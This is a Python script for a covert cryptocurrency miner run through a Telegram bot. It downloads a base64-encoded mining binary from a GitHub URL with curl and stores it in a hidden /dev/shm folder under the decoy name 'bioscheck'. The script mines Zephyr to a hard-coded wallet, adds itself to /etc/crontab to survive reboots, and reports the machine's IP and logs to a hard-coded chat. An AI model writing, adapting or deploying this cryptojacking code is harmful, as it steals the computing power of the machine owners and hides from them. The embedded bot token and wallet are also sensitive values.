import os, telebot, time, subprocess, threading, requests, socket

BOT_TOKEN = "7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y"
CHAT_ID = "7285391034"
POOL = "fr.zephyr.herominers.com:1123"
COIN = "zeph"
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"
THREADS = 4

bot = telebot.TeleBot(BOT_TOKEN)
worker_name = "default"
miner_process = None
log_path = "/dev/shm/.xmriglog"

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except: return "?"

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            sec = int(float(f.readline().split()[0]))
            m, s = divmod(sec, 60)
            h, m = divmod(m, 60)
            return f"{h}h {m}m"
    except: return "?"

def write_log(msg):
    with open(log_path, 'a') as f:
        f.write(msg + "\n")

def start_miner():
    global miner_process
    if miner_process and miner_process.poll() is None:
        return
    bin_path = "/dev/shm/.cache-xmr/bioscheck"
    os.makedirs("/dev/shm/.cache-xmr", exist_ok=True)
    if not os.path.exists(bin_path):
        cmd = "curl -s https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.b64 | base64 -d > " + bin_path
        os.system(cmd)
        os.chmod(bin_path, 0o755)

    args = [
        bin_path,
        "--donate-level=0",
        f"--threads={THREADS}",
        "-o", POOL,
        "-u", WALLET + f".{worker_name}",
        "-p", "x",
        "--coin", COIN,
        "--tls"
    ]
    with open(log_path, "w") as f: f.write("")
    miner_process = subprocess.Popen(args, stdout=open(log_path, 'a'), stderr=subprocess.STDOUT)

def stop_miner():
    global miner_process
    if miner_process:
        miner_process.terminate()
        miner_process = None

def get_speed():
    try:
        with open(log_path) as f:
            lines = f.readlines()
        for line in reversed(lines):
            if "speed" in line and "H/s" in line:
                return line.strip()
        return "No hashrate found."
    except:
        return "Log error."

def get_status():
    status = f"💠 Status\nMiner: {'Yes' if miner_process and miner_process.poll() is None else 'No'}"
    status += f"\nIP: {get_ip()}"
    status += f"\nUptime: {get_uptime()}"
    status += f"\nWorker: {worker_name}"
    status += f"\nThreads: {THREADS}"
    status += f"\nPool: {POOL}"
    return status

def watchdog():
    while True:
        if miner_process is None or miner_process.poll() is not None:
            start_miner()
        time.sleep(60)

def setup_persistence():
    cron_entry = "@reboot python3 " + os.path.abspath(__file__)
    cron_path = "/etc/crontab"
    try:
        with open(cron_path, "r") as f:
            if cron_entry in f.read():
                return
        with open(cron_path, "a") as f:
            f.write(f"\n{cron_entry}\n")
    except: pass

@bot.message_handler(commands=['start'])
def cmd_start(msg):
    if str(msg.chat.id) != CHAT_ID: return
    start_miner()
    bot.reply_to(msg, "✅ Miner started")

@bot.message_handler(commands=['stop'])
def cmd_stop(msg):
    if str(msg.chat.id) != CHAT_ID: return
    stop_miner()
    bot.reply_to(msg, "🛑 Miner stopped")

@bot.message_handler(commands=['status'])
def cmd_status(msg):
    if str(msg.chat.id) != CHAT_ID: return
    bot.reply_to(msg, get_status())

@bot.message_handler(commands=['speed'])
def cmd_speed(msg):
    if str(msg.chat.id) != CHAT_ID: return
    bot.reply_to(msg, get_speed())

@bot.message_handler(commands=['log'])
def cmd_log(msg):
    if str(msg.chat.id) != CHAT_ID: return
    try:
        with open(log_path) as f:
            content = f.read()[-4000:]  # last ~4KB
        bot.reply_to(msg, f"📄 Log:\n\n{content}")
    except:
        bot.reply_to(msg, "⚠️ No log file found.")

@bot.message_handler(commands=['setname'])
def cmd_setname(msg):
    global worker_name
    if str(msg.chat.id) != CHAT_ID: return
    try:
        parts = msg.text.split(" ", 1)
        if len(parts) < 2:
            bot.reply_to(msg, "Usage: /setname <name>")
            return
        worker_name = parts[1].strip()
        stop_miner()
        start_miner()
        bot.reply_to(msg, f"🆔 Worker set to {worker_name}")
    except:
        bot.reply_to(msg, "❌ Failed to set worker name.")

if __name__ == "__main__":
    setup_persistence()
    threading.Thread(target=watchdog, daemon=True).start()
    bot.polling(non_stop=True)
